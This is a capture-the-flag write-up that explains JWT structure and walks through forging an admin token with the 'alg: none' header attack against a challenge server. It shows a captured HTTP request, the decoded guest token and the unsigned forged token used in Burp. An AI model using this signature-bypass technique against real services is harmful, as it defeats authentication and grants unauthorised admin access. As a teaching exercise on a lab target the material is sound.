# Interstellar Ingress

**Skills:** JWT knowledge and header attacks

When you visit the website, there is a "login as guest" button. Clicking it calls the /guest-login POST endpoint.
This request sends our old cookie for the website, and in return, gets the new guest token. This is a JWT. The web request is:

```
GET / HTTP/1.1
Host: 34.129.100.231:5059
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://34.129.100.231:5059/login
Accept-Encoding: gzip, deflate, br
Cookie: interstellar_ingress_session_token=eyJhbGciOiJIUzI1NiJ9.eyJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc1OTIyMzI5Nn0.aOmEBfobHH4aSaqNRZwvXxZruokDP3QRVacsZVlPINo
If-None-Match: "grrli6"
Connection: keep-alive
```

The JWT given is:

```
eyJhbGciOiJIUzI1NiJ9.eyJpc19hZG1pbiI6ZmFsc2UsImlhdCI6MTc1OTIyMzI5Nn0.aOmEBfobHH4aSaqNRZwvXxZruokDP3QRVacsZVlPINo
```

This token has 3 parts separated by `.`s. The first two are base64-encoded:
- **Header** — metadata such as the algorithm used for signing
- **Payload** — claims about the user
- **Signature** — confirms the JWT is valid, created through a secret key

The JWT above decodes to:

```
{"alg":"HS256"} {"is_admin":false,"iat":1759223296} aOmEBfobHH4aSaqNRZwvXxZruokDP3QRVacsZVlPINo
```

As we don't have the secret key, we cannot forge the signature. The basic attack pattern here is to change the `"is_admin"` field to `true` and get the server to accept it.

The attack used is to change the `"alg"` field in the header to `"none"`. This can sometimes lead to the server accepting "insecure" JWTs with no signatures at all — and this is exactly the exploit.

Encode the following:

```
{"alg":"none"} {"is_admin":true,"iat":1759223296}
```

Result (remove trailing `=` signs, add dots where needed):

```
eyJhbGciOiJub25lIn0.eyJpc19hZG1pbiI6dHJ1ZSwiaWF0IjoxNzU5MjIzMjk2fQ.
```

In Burp, change the token field to this forged JWT on the next login. The flag is:

![flag screenshot](/content/ctfs/image.png)

---

[Previous: Conditional Constellation](/content/ctfs/quantum/conditional-constellation.md) | [Next: Star Maps](/content/ctfs/quantum/star-maps.md) | [Back to Quantum](/content/ctfs/quantum.md)
